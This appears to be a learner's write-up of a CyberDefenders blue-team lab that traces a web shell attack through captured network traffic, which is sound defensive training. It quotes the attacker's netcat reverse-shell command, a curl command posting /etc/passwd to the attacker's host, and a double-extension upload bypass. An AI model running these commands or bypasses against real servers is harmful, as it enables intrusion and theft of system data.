# 🕵️ Digital Forensics Investigation: Malicious Web Shell Network Attack

## 📌 Platform  
CyberDefenders DFIR Lab : Webstrike lab

---

# 🧾 Scenario Overview
A suspicious security incident was detected on a company web server.  
Network traffic was captured and provided as a PCAP file for forensic analysis.

Initial indicators suggested:
- Unauthorized file upload  
- Malicious web shell deployment  
- Reverse shell communication  
- Attempted data exfiltration  

The objective of this investigation was to analyze the captured network traffic and determine attacker actions, techniques used, and overall impact.

---

# 🎯 Investigation Objectives
- Identify attacker origin  
- Determine attack method  
- Identify malicious payload  
- Analyze attacker communications  
- Detect exfiltration attempts  
- Build attack timeline  
- Assess overall impact  

---

# 🛠 Tools Used
- Wireshark (PCAP traffic analysis)  
- IP geolocation lookup  
- HTTP stream analysis  
- Network filtering techniques  

---

# 🔍 Forensic Analysis & Findings

## 1️⃣ Attacker Geographical Origin
Using Wireshark:

Statistics → Endpoints → IPv4

Two communicating IP addresses were identified:
- Attacker IP: 117.11.88.124  
- Victim Server: 24.49.63.79  

The attacker IP was analyzed using geolocation lookup and traced to:

Tianjin, China

This information is useful for threat intelligence and geo-blocking defensive measures.

---

## 2️⃣ Attacker User-Agent Identification
HTTP stream analysis revealed the following User-Agent:

Mozilla/5.0 (X11; Linux x86_64; rv:109.0)  
Gecko/20100101 Firefox/115.0

This indicates the attacker attempted to mimic a legitimate Linux Firefox browser to evade detection.

---

## 3️⃣ Malicious Web Shell Upload
Filtering POST requests from attacker:

ip.src == 117.11.88.124 && http.request.method == "POST"

The attacker attempted to upload:

First attempt:
image.php  
Result: Rejected (invalid format)

Second attempt:
image.jpg.php  
Result: Upload successful

The attacker bypassed file validation by disguising the PHP file as an image.

The uploaded file contained a reverse shell payload.

---

## 4️⃣ Upload Directory Identified
Analysis of HTTP responses revealed uploaded files were stored in:

/reviews/uploads/

This directory allowed execution of uploaded scripts, enabling persistence.

---

## 5️⃣ Reverse Shell Communication
Inspection of the web shell revealed:

nc 117.11.88.124 8080

Reverse shell connection details:
- Attacker IP: 117.11.88.124  
- Port: 8080  

This allowed the attacker to execute remote commands on the compromised server.

---

## 6️⃣ Data Exfiltration Attempt
Filtering reverse shell traffic:

tcp.port == 8080

Command observed:

curl -X POST -d /etc/passwd http:// 117.11.88.124:443/

Targeted file:
/etc/passwd

This file contains system user account information and is valuable for reconnaissance and privilege escalation.

Indicates attempted sensitive data exfiltration.

---

# ⏱ Attack Timeline

| Stage | Activity |
|------|---------|
| Initial Access | Attacker connects to web server |
| Exploitation | File upload validation bypass |
| Persistence | Web shell uploaded |
| Command & Control | Reverse shell established |
| Exfiltration | Attempted theft of /etc/passwd |

---

# 🚨 Impact Assessment
Severity Level: HIGH

Impact observed:
- Unauthorized server access  
- Remote command execution  
- Persistent backdoor created  
- Attempted sensitive data exfiltration  

The server was fully compromised and attacker gained control.

---

# 🛡 Security Recommendations
- Implement strict file upload validation  
- Restrict execution permissions in upload directories  
- Monitor outbound network traffic  
- Deploy IDS/IPS monitoring  
- Use Web Application Firewall (WAF)  
- Enable log monitoring and alerting  
- Apply geo-blocking where necessary  

---

# 🧠 Skills Demonstrated
- Network forensics  
- PCAP traffic analysis  
- Threat detection and analysis  
- Incident response investigation  
- Attacker behavior analysis  
- Evidence documentation  

---

# 📚 Conclusion
This investigation demonstrated how improper file upload validation can lead to full system compromise.  
Through detailed PCAP analysis, the attacker’s origin, techniques, persistence methods, and exfiltration attempts were identified.

Understanding these attack patterns enables stronger defensive strategies and improved incident response capabilities.


https://cyberdefenders.org/blueteam-ctf-challenges/achievements/shezasheriff08/webstrike/
